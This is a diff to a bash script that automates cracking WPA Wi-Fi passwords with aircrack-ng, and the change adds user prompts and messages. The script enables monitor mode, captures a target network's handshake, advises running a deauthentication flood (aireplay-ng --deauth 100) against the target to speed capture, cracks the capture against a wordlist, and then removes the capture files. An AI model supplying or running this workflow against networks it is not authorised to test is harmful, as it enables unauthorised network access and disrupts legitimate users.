@@ -13,7 +13,8 @@ sudo systemctl stop NetworkManager.service
 sudo killall wpa-supplicant
 sudo airmon-ng start $1
 
-echo "Starting dump"
+echo "First we scan for a target. We need BSSID & the channel to attack"
+read -n 1 -s -p "Press any key to start dump"
 sudo airodump-ng $1mon
 
 echo "Please choose target BSSID: "
@@ -21,12 +22,14 @@ read target
 echo "please choose target channel"
 read channel
 
-echo "To speed things up run: 'aireplay-ng --deauth 100 -a $target $1mon --ignore-negative-one' in another terminal ;D"
+echo "We try to catch the Handshake! Wait until you get him!"
+echo "To speed things up run as root: 'aireplay-ng --deauth 100 -a $target $1mon --ignore-negative-one' in another terminal ;D"
 read -n 1 -s -p "Press any key to continue"
 
 airodump-ng -c $channel --bssid $target -w WPAcrack $1mon --ignore-negative-one
 
 echo "Start cracking!"
+echo "[ALERT!] If you dont got the Handshake, you need to redo airodump-ng until you get him!"
 sudo aircrack-ng -w $2 -b $target WPAcrack-01.cap
 
 echo "Restoring interfaces"
@@ -40,4 +43,5 @@ sudo rm -rf WPAcrack*.kismet.csv
 sudo rm -rf WPAcrack*.csv
 sudo rm -rf WPAcrack*.cap
 
+echo ""
 echo "ready."
